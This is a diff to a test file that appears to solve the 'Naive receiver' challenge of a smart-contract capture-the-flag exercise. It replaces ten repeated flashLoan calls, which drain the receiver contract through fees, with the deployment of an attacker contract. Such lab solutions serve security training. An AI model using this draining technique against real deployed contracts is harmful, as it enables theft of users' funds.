@@ -31,16 +31,10 @@ describe('[Challenge] Naive receiver', function () {
 
   it('Exploit', async function () {
     /** CODE YOUR EXPLOIT HERE */
-    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
-    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
-    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
-    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
-    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
-    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
-    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
-    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
-    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
-    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
+
+    this.rekt = await (
+      await ethers.getContractFactory('RektNaiveReceiver', attacker)
+    ).deploy(this.pool.address, this.receiver.address);
   });
 
   after(async function () {
